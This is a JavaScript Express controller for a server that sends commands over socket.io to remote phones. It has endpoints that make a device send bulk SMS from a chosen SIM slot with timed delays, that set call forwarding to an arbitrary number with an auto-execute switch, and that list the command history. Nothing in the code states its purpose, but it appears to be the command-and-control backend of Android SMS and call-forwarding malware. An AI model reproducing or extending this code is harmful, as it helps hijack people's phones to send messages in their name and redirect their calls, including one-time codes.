import Command from '../models/CommandModel.js';
import User from '../models/UserModel.js';
import { normalizeDeviceId } from '../helpers/deviceId.js';

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const sanitizeNumber = (value = '') => String(value).replace(/[^0-9]/g, '');

const normalizeNumbers = (numbers = [], minDigits = 10, maxDigits = 15, maxItems = 100) => {
  const valid = [];
  const invalid = [];
  const seen = new Set();

  for (const raw of numbers) {
    const cleaned = sanitizeNumber(raw);

    if (!cleaned) continue;

    if (cleaned.length < minDigits || cleaned.length > maxDigits) {
      invalid.push(String(raw));
      continue;
    }

    if (!seen.has(cleaned) && valid.length < maxItems) {
      seen.add(cleaned);
      valid.push(cleaned);
    }
  }

  return { valid, invalid };
};

const normalizeIncomingDeviceId = (value) => normalizeDeviceId(String(value || '').trim());

const findUserByDeviceId = async (rawDeviceId) => {
  const normalized = normalizeIncomingDeviceId(rawDeviceId);

  return User.findOne({
    $or: [
      { deviceId: String(rawDeviceId).trim() },
      { deviceId: normalized },
    ],
  });
};

const buildSocketPayload = (command, extra = {}) => {
  const raw = typeof command.toObject === 'function' ? command.toObject() : command;
  const commandId = String(raw._id);

  return {
    ...raw,
    id: commandId,
    payload: {
      ...(raw.payload || {}),
      commandId,
      uniqueCommandId: commandId,
    },
    ...extra,
  };
};

const emitDeviceEvent = (deviceId, eventName, command, extra = {}) => {
  const payload = buildSocketPayload(command, extra);
  global.io.to(deviceId).emit(eventName, payload);
  return payload;
};

export const sendSms = async (req, res) => {
  try {
    const {
      deviceId,
      to,
      numbers,
      body,
      slot = 0,
      delayMs = 2500,
      requestedBy = 'admin',
      priority = 'normal',
    } = req.body;

    const normalizedDeviceId = normalizeIncomingDeviceId(deviceId);

    if (!normalizedDeviceId) {
      return res.status(400).json({ error: 'deviceId is required' });
    }

    if (!body || !String(body).trim()) {
      return res.status(400).json({ error: 'Message body is required' });
    }

    if (![0, 1].includes(Number(slot))) {
      return res.status(400).json({ error: 'slot must be 0 or 1' });
    }

    const device = await findUserByDeviceId(deviceId);
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const rawNumbers = Array.isArray(numbers)
      ? numbers
      : to
        ? [to]
        : [];

    if (!rawNumbers.length) {
      return res.status(400).json({ error: 'Provide "to" or "numbers"' });
    }

    const { valid, invalid } = normalizeNumbers(rawNumbers, 10, 15, 100);

    if (!valid.length) {
      return res.status(400).json({
        error: 'No valid phone numbers found',
        invalid,
      });
    }

    const bulkId = `bulk_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    const isBulk = valid.length > 1;
    const finalDelayMs = Math.max(0, Number(delayMs) || 2500);

    const commands = await Command.insertMany(
      valid.map((number, index) => ({
        deviceId: normalizedDeviceId,
        action: 'SEND_SMS',
        payload: {
          to: number,
          body: String(body).trim(),
          slot: Number(slot),
          timestamp: Date.now(),
          requestedBy,
          priority,
          bulkId,
          bulkIndex: index + 1,
          bulkTotal: valid.length,
        },
        done: false,
      }))
    );

    const socketsInRoom = await global.io.in(normalizedDeviceId).fetchSockets();
    const deviceOnline = socketsInRoom.length > 0;

    if (!deviceOnline) {
      return res.status(202).json({
        success: true,
        queued: true,
        message: isBulk
          ? `${commands.length} SMS commands queued; device is offline`
          : 'SMS command queued; device is offline',
        deviceId: normalizedDeviceId,
        bulkId,
        total: commands.length,
        validNumbers: valid,
        invalidNumbers: invalid,
        commandIds: commands.map(cmd => String(cmd._id)),
      });
    }

    for (let i = 0; i < commands.length; i++) {
      const cmd = commands[i];

      emitDeviceEvent(normalizedDeviceId, 'send-sms-command', cmd, {
        urgent: true,
        type: 'sms',
      });

      console.log(`📤 SMS command emitted ${i + 1}/${commands.length} to ${normalizedDeviceId}`);
      console.log(`   To: ${cmd.payload.to}`);
      console.log(`   Slot: ${cmd.payload.slot}`);
      console.log(`   Command ID: ${cmd._id}`);

      if (i < commands.length - 1) {
        await sleep(finalDelayMs);
      }
    }

    return res.status(200).json({
      success: true,
      queued: false,
      message: isBulk
        ? `${commands.length} bulk SMS commands created and emitted`
        : 'SMS command created and emitted',
      deviceId: normalizedDeviceId,
      bulkId,
      total: commands.length,
      validNumbers: valid,
      invalidNumbers: invalid,
      commandIds: commands.map(cmd => String(cmd._id)),
      delayMs: finalDelayMs,
    });
  } catch (error) {
    console.error('❌ sendSms error:', error);
    return res.status(500).json({
      error: 'Failed to process SMS command',
      message: error.message,
    });
  }
};

export const getCommandStatus = async (req, res) => {
  try {
    const normalizedDeviceId = normalizeIncomingDeviceId(req.params.deviceId);

    const commands = await Command.find({ deviceId: normalizedDeviceId })
      .sort({ createdAt: -1 })
      .limit(100);

    res.json({
      success: true,
      commands,
    });
  } catch (error) {
    console.error('❌ getCommandStatus error:', error);
    res.status(500).json({
      error: 'Failed to fetch command status',
    });
  }
};

export const callForward = async (req, res) => {
  try {
    const {
      deviceId,
      slot,
      number,
      autoExecute = false,
      priority = 'normal',
    } = req.body;

    const normalizedDeviceId = normalizeIncomingDeviceId(deviceId);

    if (!normalizedDeviceId || !number) {
      return res.status(400).json({ error: 'deviceId and number are required' });
    }

    const device = await findUserByDeviceId(deviceId);
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const command = await Command.create({
      deviceId: normalizedDeviceId,
      action: 'CALL_FORWARD',
      payload: {
        slot: Number(slot) || 0,
        number: String(number).trim(),
        timestamp: Date.now(),
        requestedBy: 'admin',
        autoExecute,
        priority,
      },
      done: false,
    });

    emitDeviceEvent(normalizedDeviceId, 'call-forward-command', command, {
      urgent: true,
      type: 'call_forward',
    });

    res.json({ success: true, command });
  } catch (error) {
    console.error('❌ callForward error:', error);
    res.status(500).json({ error: 'Failed to create call forward command' });
  }
};

export const toggleAutoExecution = async (req, res) => {
  try {
    const normalizedDeviceId = normalizeIncomingDeviceId(req.body.deviceId);
    const { enabled } = req.body;

    const user = await User.findOneAndUpdate(
      { deviceId: normalizedDeviceId },
      { 'callForwardingSettings.autoExecuteEnabled': !!enabled },
      { new: true }
    );

    if (!user) {
      return res.status(404).json({ error: 'Device not found' });
    }

    res.json({
      success: true,
      enabled: user.callForwardingSettings?.autoExecuteEnabled ?? false,
    });
  } catch (error) {
    console.error('❌ toggleAutoExecution error:', error);
    res.status(500).json({ error: 'Failed to toggle auto execution' });
  }
};

export const checkCallForwardingStatus = async (req, res) => {
  return res.status(501).json({
    error: 'checkCallForwardingStatus is not supported by the current mobile build',
  });
};